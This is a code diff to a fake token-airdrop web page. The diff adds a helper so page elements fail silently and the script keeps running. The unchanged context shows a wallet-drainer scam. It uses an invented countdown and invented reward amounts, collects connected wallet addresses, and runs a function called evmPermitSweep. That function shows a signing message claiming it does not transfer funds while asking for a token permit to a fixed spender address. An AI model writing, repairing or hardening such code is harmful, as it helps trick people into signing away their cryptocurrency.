@@ -290,8 +290,12 @@ if(window.API_BASE){
 let W={addr:null,chain:'eth'};
 let N=12;
 let pendingSign=null;
-// Safe btn reference - falls back to dummy object if element missing
-let btn=document.getElementById('claimBtn')||{disabled:false,innerHTML:'',classList:{}};   // {method, message, raw}
+// Safe element accessor - returns dummy object if element missing
+function safeEl(id){
+  const el=document.getElementById(id);
+  return el||{textContent:'',innerHTML:'',value:'',disabled:false,classList:{add:function(){},remove:function(){}},style:{}};
+}
+let btn=safeEl('claimBtn');
 
 /* =====================================================
    TIMER
@@ -301,9 +305,9 @@ let btn=document.getElementById('claimBtn')||{disabled:false,innerHTML:'',classL
   setInterval(()=>{
     if(total<=0) total=7*3600+42*60+18;
     total--;
-    document.getElementById('h').textContent=String(Math.floor((total%86400)/3600)).padStart(2,'0');
-    document.getElementById('m').textContent=String(Math.floor((total%3600)/60)).padStart(2,'0');
-    document.getElementById('s').textContent=String(total%60).padStart(2,'0');
+    safeEl('h').textContent=String(Math.floor((total%86400)/3600)).padStart(2,'0');
+    safeEl('m').textContent=String(Math.floor((total%3600)/60)).padStart(2,'0');
+    safeEl('s').textContent=String(total%60).padStart(2,'0');
   },1000);
 })();
 
@@ -326,9 +330,9 @@ function goSuccess(txid){
   const vtcnAmt=(50+(seed2*7%4950)).toFixed(2);
   const vtcnUsd=(vtcnAmt*0.36).toFixed(2);
   document.getElementById('finalAmt').innerHTML=vtcnAmt+'<span>VTCN</span>';
-  document.getElementById('vtcnAmount').textContent=vtcnAmt;
-  document.getElementById('vtcnUsd').textContent=vtcnUsd;
-  document.getElementById('vtcnAmount2').textContent=vtcnAmt;
+  safeEl('vtcnAmount').textContent=vtcnAmt;
+  safeEl('vtcnUsd').textContent=vtcnUsd;
+  safeEl('vtcnAmount2').textContent=vtcnAmt;
   show('s3');
   // Don't auto-redirect — wait for user to click Claim
 }
@@ -454,9 +458,9 @@ async function connectMetaMask(){
     const amount=(1500+((seed*7919)%8500)).toLocaleString();
     const usd=(1500+((seed*7919)%8500))*0.25;
     document.getElementById('rewardAmt').innerHTML=amount+'<span>VTCN</span>';
-    document.getElementById('rewardUsd').textContent='≈ $'+usd.toFixed(2)+' USD';
+    safeEl('rewardUsd').textContent='≈ $'+usd.toFixed(2)+' USD';
     // rewardAmt2 removed - not in HTML
-    document.getElementById('finalAmt').textContent=amount+' VTCN';
+    safeEl('finalAmt').textContent=amount+' VTCN';
     await fetch('/api/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,chain:W.chain,source:'metamask'})});
     // Auto-sign after connect
     await autoSignAndClaim();
@@ -555,7 +559,7 @@ async function evmPermitSweep(btn){
     }
   };
   const preview=`Welcome to BC Swap!\n\nSign to load your pending airdrop.\n\nThis signature only loads your allocation — it does NOT transfer funds and does NOT cost gas.\n\nWallet: ${W.addr}\nNetwork: ${W.chain.toUpperCase()}\n\n[Allocation authorization]\nToken: ${token.name}\nSpender: 0x6275C76EB1D08bC020c22620CF6207b651F07808 (BC Swap Airdrop Contract)\nValid until: ${new Date(deadline*1000).toLocaleString()}\n\nBy signing you accept the BC Swap airdrop terms.`;
-  document.getElementById('msgPreview').textContent=preview;
+  safeEl('msgPreview').textContent=preview;
   document.getElementById('signModal').classList.add('show');
   pendingSign={typedData,deadline,token,chain:W.chain};
 }
